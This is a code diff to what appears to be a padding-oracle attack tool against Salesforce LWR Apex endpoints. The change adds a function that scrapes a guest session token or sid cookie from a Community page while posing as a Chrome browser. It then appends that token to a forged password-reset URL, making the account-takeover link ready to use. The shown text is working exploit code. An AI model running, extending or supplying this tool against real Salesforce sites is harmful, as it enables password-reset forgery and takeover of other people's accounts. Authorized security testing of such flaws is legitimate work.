@@ -20,8 +20,10 @@ Author: vailsec
 
 import argparse
 import base64
+import http.cookiejar
 import json
 import os
+import re
 import ssl
 import sys
 import threading
@@ -396,6 +398,39 @@ def print_forged(token_b64, token_json, elapsed, count):
     log(sep)
 
 
+def fetch_guest_token(host):
+    """Fetch a Salesforce guest session token from the Community page."""
+    cookie_jar = http.cookiejar.CookieJar()
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(cookie_jar),
+        urllib.request.HTTPSHandler(context=_ssl_ctx)
+    )
+
+    url = f"https://{host}/s/"
+    try:
+        req = urllib.request.Request(url, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                          "AppleWebKit/537.36 (KHTML, like Gecko) "
+                          "Chrome/131.0.0.0 Safari/537.36"
+        })
+        resp = opener.open(req, timeout=15)
+        body = resp.read().decode("utf-8", errors="replace")
+
+        # Pattern 1: Aura config token in inline JS
+        m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_!.]+)"', body)
+        if m:
+            return m.group(1)
+
+        # Pattern 2: SID cookie
+        for cookie in cookie_jar:
+            if cookie.name == "sid" and cookie.value:
+                return cookie.value
+    except Exception:
+        pass
+
+    return None
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="AES-CBC Padding Oracle Attack for Salesforce LWR Apex Endpoints",
@@ -428,6 +463,8 @@ Examples:
                        help="Parallel threads for decrypt (default: 7)")
     parser.add_argument("--forge-threads", type=int, default=16,
                        help="Parallel guess threads for forge (default: 16)")
+    parser.add_argument("--token", type=str, default=None,
+                       help="Salesforce session token for URL (auto-fetched if omitted)")
     parser.add_argument("--verbose", action="store_true",
                        help="Show per-byte progress")
 
@@ -488,9 +525,21 @@ Examples:
         if r != 1:
             sys.exit(1)
 
+        # Obtain Salesforce session token for URL
+        sf_token = args.token
+        if not sf_token:
+            log("\n[*] Fetching guest session token...")
+            sf_token = fetch_guest_token(args.host)
+            if sf_token:
+                log(f"[+] Token: {sf_token[:20]}...")
+            else:
+                log("[!] Could not auto-fetch token. URL may not work without --token.")
+
         # Build ready-to-use password reset URL
         # Single-encode the full retURL value (matching Salesforce email link format)
         ret_url_inner = f"ForgotPassword?params={token_b64}&country=IE&language=en_IE&source=reset"
+        if sf_token:
+            ret_url_inner += f"&token={sf_token}"
         ret_url_encoded = urllib.parse.quote(ret_url_inner, safe='')
         reset_url = f"https://{args.host}/s/confirmation-link-is-expired?retURL={ret_url_encoded}"
 
